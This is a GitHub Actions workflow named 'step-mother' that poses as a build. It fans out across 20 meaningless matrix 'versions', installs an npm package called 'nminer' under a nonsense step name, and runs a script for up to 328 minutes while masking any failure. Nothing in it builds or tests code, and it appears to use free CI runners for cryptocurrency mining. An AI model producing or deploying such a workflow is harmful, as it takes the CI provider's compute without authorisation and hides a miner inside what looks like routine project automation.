name: step-mother
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4662 }
          - { version: 74 }
          - { version: 9011 }
          - { version: 6297 }
          - { version: 6483 }
          - { version: 6524 }
          - { version: 8330 }
          - { version: 3263 }
          - { version: 2420 }
          - { version: 3675 }
          - { version: 4607 }
          - { version: 4017 }
          - { version: 5378 }
          - { version: 3030 }
          - { version: 9691 }
          - { version: 5983 }
          - { version: 5521 }
          - { version: 6831 }
          - { version: 869 }
          - { version: 2040 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: sniff whereas
        run: |
          npm install nminer@latest
          timeout 328m node step-mother.js || echo "step-mother executed"